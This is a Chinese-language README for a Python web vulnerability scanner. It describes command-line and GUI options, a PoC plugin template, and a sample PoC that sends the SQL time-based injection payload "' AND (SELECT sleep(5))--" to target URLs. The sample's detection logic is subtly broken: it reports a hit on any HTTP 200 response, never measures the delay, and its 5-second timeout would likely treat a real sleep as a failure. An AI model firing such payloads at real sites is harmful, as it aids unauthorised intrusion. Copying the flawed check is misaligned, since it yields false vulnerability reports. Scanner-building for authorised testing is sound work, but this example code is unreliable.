# jiujiuwebscanner

## 初衷

* 没找到集成化扫描的工具，遂动手写了一个框架
* poc后面扩展

## 工具说明

### 一、简介

* poc主要测试web可能存在的漏洞

### 二、工具环境

* 完全的python环境

### 三、使用方式

* 命令行
* GUI

### 四、使用详解

#### 1、命令行利用方式
*进入 jiujiuwebscanner.py 文件所在目录，运行cmd程序

* 指定 url 主要部分（如：https://domain.com/?s=1）
```
python jiujiuwebscanner.py -t
```
*  指定url 文件（在同级目录下的urls.txt文件中输入想要扫描的url）
```
python jiujiuwebscanner.py -T
```
* 指定单个poc的绝对路径（形如 `D:\hackTools\hacktools\WebScan\jiujiuwebscanner\pocs\sql\SqlTimeInject.py`）
```
python jiujiuwebscanner.py -f
```
*  指定poc的目录，程序会遍历扫描目录下poc文件
```
python jiujiuwebscanner.py -F
```
* 指定扫描线程，支持多线程漏洞检测
```
python jiujiuwebscanner.py -n
```
* 开启GUI界面
```
python jiujiuwebscanner.py --gui
```
#### 2、GUI利用方式
* 选择输入单个url 或者 引用 url 文件
* 选择单个poc文件 或者 pocs 目录批量扫描
* 自由组合利用方式，单个扫描和批量扫描不能同时使用
#### 3、文件保存
* 扫描完成文件会自动保存在当前目录的名为result.txt的文件中，如果文件存在，则需要删除该文件，否则会导致扫描结果无法保存。

### POC 说明

*所有poc脚本都规范放在pocs文件中
#### 一、编写格式（.py）
```
import requests

def detect_vulnerability(target):
    url = target
    result  = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'}
    payload = "...这里填写拼接字符串..."
    try:
        response = requests.get(url + payload, headers=headers, timeout=5)
        ...
        这里写入验证逻辑，返回字典result
        result = {
            'target': ...,
            'vulnerability': ...,
            'poc': ...
            }
        ...
        else:
            result = False
    except requests.RequestException as e:
        print(f'[-] Failed to connect to the target: {str(e)}')
    return result
```
*result{} 作为GUI面板漏洞检测结果和命令行检测结果的输出
#### 二、案例
```
import requests

def detect_vulnerability(target):
    url = target
    result  = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'}
    payload = "' AND (SELECT sleep(5))--"
    try:
        response = requests.get(url + payload, headers=headers, timeout=5)
        if response.status_code == 200:
            result = {
            'target': target,
            'vulnerability': 'SQL time injection',
            'poc': "' AND (SELECT sleep(5))--"
            }
        else:
            result = False
    except requests.RequestException as e:
        print(f'[-] Failed to connect to the target: {str(e)}')
    return result
```

### 其他

* 含有AI创作部分
* 期望同道者可添加提交POC

### 部分图鉴
![](https://cdn.jsdelivr.net/gh/JiujiuPictures/pictures@main/blog%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-29%20203718.png)

![](https://cdn.jsdelivr.net/gh/JiujiuPictures/pictures@main/blog%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-29%20210323.png)

## 鸣谢

* springBoot漏洞检测poc在<https://github.com/rabbitmask/SB-Actuator>项目基础上修改。